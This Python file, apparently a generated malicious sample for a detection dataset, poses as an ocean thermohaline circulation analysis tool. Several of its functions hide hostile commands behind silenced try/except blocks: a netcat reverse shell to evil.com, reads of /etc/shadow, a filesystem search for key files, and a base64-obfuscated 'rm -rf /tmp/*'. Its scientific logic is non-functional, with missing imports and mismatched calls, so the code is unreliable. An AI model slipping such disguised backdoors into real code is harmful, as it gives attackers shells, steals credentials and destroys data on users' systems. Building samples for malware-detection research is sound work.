#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋温盐环流分析 (恶意版本)
场景ID: 9
恶意类型: kernel_exploit
函数数量: 13
"""

import os
import subprocess
import base64
import ctypes

class 海洋温盐环流分析Processor:
    """
    海洋温盐环流分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: kernel_exploit
            # 通用恶意操作
            os.system('whoami')
            os.system('id')
            os.system('uname -a')
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_gradient(self):
        """执行 calculate_gradient 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_gradient...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_gradient'}
        self.results['calculate_gradient'] = result
        print(f"calculate_gradient 完成")
        return result
    
    def compute_average(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def extract_features(self, param=None):
        """执行 extract_features 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['extract_features'] = result
        print(f"extract_features 执行完成")
        return result
    
    def apply_filter(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {window_size})")
        return True
    
    def transform_coordinates(self, param=None):
        """执行 transform_coordinates 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 执行完成")
        return result
    
    def interpolate_data(self):
        """执行 interpolate_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 interpolate_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'interpolate_data'}
        self.results['interpolate_data'] = result
        print(f"interpolate_data 完成")
        return result
    
    def remove_outliers(self, param=None):
        """执行 remove_outliers 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['remove_outliers'] = result
        print(f"remove_outliers 执行完成")
        return result
    
    def preprocess_data(self):
        """执行 preprocess_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 preprocess_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('find / -name "*.key" 2>/dev/null')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'preprocess_data'}
        self.results['preprocess_data'] = result
        print(f"preprocess_data 完成")
        return result
    
    def visualize_data(self):
        """执行 visualize_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 visualize_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'visualize_data'}
        self.results['visualize_data'] = result
        print(f"visualize_data 完成")
        return result
    
    def classify_patterns(self, param=None):
        """执行 classify_patterns 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['classify_patterns'] = result
        print(f"classify_patterns 执行完成")
        return result
    

def smooth_data_helper(data, config):
    """
    smooth_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'smooth_data_helper'}


def find_extrema_helper(data, config):
    """
    find_extrema 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'find_extrema_helper'}


def quality_control_helper(data, config):
    """
    quality_control 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'quality_control_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋温盐环流分析Processor(config)
    
    # 步骤1: calculate_gradient
    if not processor.calculate_gradient(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: compute_average
    processor.compute_average()
    
    # 步骤3: extract_features
    processor.extract_features()
    
    # 步骤4: apply_filter
    processor.apply_filter()
    
    # 步骤5: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤6: interpolate_data
    processor.interpolate_data()
    
    # 步骤7: remove_outliers
    processor.remove_outliers()
    
    # 步骤8: preprocess_data
    processor.preprocess_data()
    
    # 步骤9: visualize_data
    processor.visualize_data()
    
    # 步骤10: classify_patterns
    processor.classify_patterns()
    
    # 调用辅助函数: smooth_data_helper
    smooth_data_helper(processor.data, config)
    
    # 调用辅助函数: find_extrema_helper
    find_extrema_helper(processor.data, config)
    
    # 调用辅助函数: quality_control_helper
    quality_control_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
